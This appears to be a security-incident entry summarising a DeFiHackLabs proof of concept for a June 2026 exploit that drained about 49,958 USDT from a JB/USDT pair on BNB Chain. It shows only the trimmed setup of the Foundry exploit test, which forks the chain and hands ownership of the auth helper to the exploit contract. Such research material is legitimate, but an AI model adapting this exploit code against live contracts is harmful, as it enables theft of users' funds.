# [?] JB - JB helper repeated cycle drains JB/USDT pair

## Summary
Severity: Unknown
Chain: BNB Chain
Component: JB
Published: 2026-06-18
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/JB_exp.sol
Type: defi-exploit-poc

## Details
Lost: 49,958.06 USDT

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 104_980_466;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = USDT_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(JB, "JB");
        vm.label(FLASH_LENDER, "Flash Lender");
        vm.label(VENUS_COMPTROLLER, "Venus Comptroller");
        vm.label(V_WBNB, "vWBNB");
        vm.label(V_USDT, "vUSDT");
        vm.label(JB_GATEWAY, "JB Gateway");
        vm.label(JB_USDT_PAIR, "JB/USDT Pair");
        vm.label(JB_AUTH_HELPER, "JB Auth Helper");
    }

    function testExploit() public balanceLog {
        uint256 attackerBalanceBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);
        JBExploit exploit = new JBExploit();

        address helperOwner = IJBAuthHelper(JB_AUTH_HELPER).owner();

        // Harness setup: make the fresh PoC contract the JB_AUTH_HELPER owner/admin.
        vm.prank(helperOwner);
        IJBAuthHelper(JB_AUTH_HELPER).transferOwnership(address(exploit));
        assertEq(IJBAuthHelper(JB_AUTH_HELPER).owner(), address(exploit), "helper owner");

        // The gateway still checks parent(address(exploit)); the helper rejects self-referrers,
        // so bind the fresh owner/admin to the previous non-self referrer root.
        vm.prank(address(exploit));
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/JB_exp.sol_
